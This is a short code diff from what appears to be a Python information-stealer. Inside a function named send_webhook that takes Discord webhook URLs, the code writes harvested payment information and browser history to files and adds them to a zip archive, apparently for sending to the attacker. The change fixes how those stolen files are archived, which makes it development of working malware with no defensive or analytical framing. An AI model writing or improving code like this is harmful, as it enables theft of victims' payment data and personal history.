@@ -242,11 +242,10 @@ def send_webhook(DISCORD_WEBHOOK_URLs):
                 with open(os.path.join(td, "Payment Info.txt"), 'w') as f:
                     for i in pay_l:
                         f.write(f"{i}\n")
-                zip.write("Payment Info.txt")
-                os.remove("Payment Info.txt")
+                    zip.write(f.name)
             with open(os.path.join(td, 'History.txt'), 'w') as f:
                 f.write(find_His())
-            zip.write(os.path.join(td, 'History.txt'))
+                zip.write(f.name)
             for name_f, _ in files_names:
                 if os.path.exists(name_f):
                     zip.write(name_f)
